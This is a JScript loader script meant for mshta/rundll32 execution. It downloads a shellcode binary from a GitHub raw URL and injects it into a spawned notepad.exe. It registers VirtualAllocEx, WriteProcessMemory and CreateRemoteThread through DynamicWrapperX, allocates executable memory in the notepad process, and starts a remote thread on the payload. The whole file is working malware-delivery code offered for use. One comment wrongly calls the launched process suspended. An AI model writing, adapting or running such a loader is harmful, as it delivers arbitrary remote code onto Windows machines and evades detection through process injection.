// Fixed JScript for rundll32 / mshta execution
// Downloads Donut shellcode → injects into suspended notepad.exe

var url = "https://github.com/MJansen6/bp/raw/refs/heads/main/shellcode.bin";   // ← raw binary (NOT base64)

try {
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();

    if (xhr.status != 200) {
        throw "Download failed: " + xhr.status;
    }

    var shellcode = xhr.responseBody;   // ← this is VARIANT array of bytes (correct for binary!)

    // ───────────────────────────────────────────────
    // Register DynamicWrapperX functions
    // You need DynamicWrapperX.dll registered or in path
    // (classic red-team tool — https://github.com/Arvanaghi/DynamicWrapperX or similar)
    // ───────────────────────────────────────────────

    var DX = new ActiveXObject("DynamicWrapperX");

    // VirtualAlloc
    DX.Register("kernel32.dll", "VirtualAlloc", "i=iii", "r=i");
    // VirtualAllocEx
    DX.Register("kernel32.dll", "VirtualAllocEx", "i=liii", "r=l");
    // WriteProcessMemory
    DX.Register("kernel32.dll", "WriteProcessMemory", "i=lllii", "r=i");
    // CreateRemoteThread
    DX.Register("kernel32.dll", "CreateRemoteThread", "i=llllll", "r=l");
    // ResumeThread
    DX.Register("kernel32.dll", "ResumeThread", "i=l", "r=l");

    // Create suspended notepad
    var WshShell = new ActiveXObject("WScript.Shell");
    var exec = WshShell.Exec("notepad.exe");
    var pid = exec.ProcessID;

    // You need process handle — this is tricky in pure JScript
    // Fallback: use OpenProcess via DynamicWrapperX
    DX.Register("kernel32.dll", "OpenProcess", "i=iii", "r=l");
    var PROCESS_ALL_ACCESS = 0x1F0FFF;
    var hProcess = DX.OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    if (!hProcess) throw "OpenProcess failed";

    var size = shellcode.length;

    // Allocate in remote process (RWX for simplicity)
    var MEM_COMMIT = 0x1000;
    var MEM_RESERVE = 0x2000;
    var PAGE_EXECUTE_READWRITE = 0x40;

    var addr = DX.VirtualAllocEx(hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!addr) throw "VirtualAllocEx failed";

    // Write shellcode
    var written = 0;
    DX.WriteProcessMemory(hProcess, addr, shellcode, size, written);

    // Create remote thread pointing to shellcode
    var hThread = DX.CreateRemoteThread(hProcess, 0, 0, addr, 0, 0, 0);

    if (!hThread) throw "CreateRemoteThread failed";

    WScript.Echo("Shellcode injected into notepad.exe (PID: " + pid + ")");

} catch (e) {
    WScript.Echo("Error: " + e.message);
}
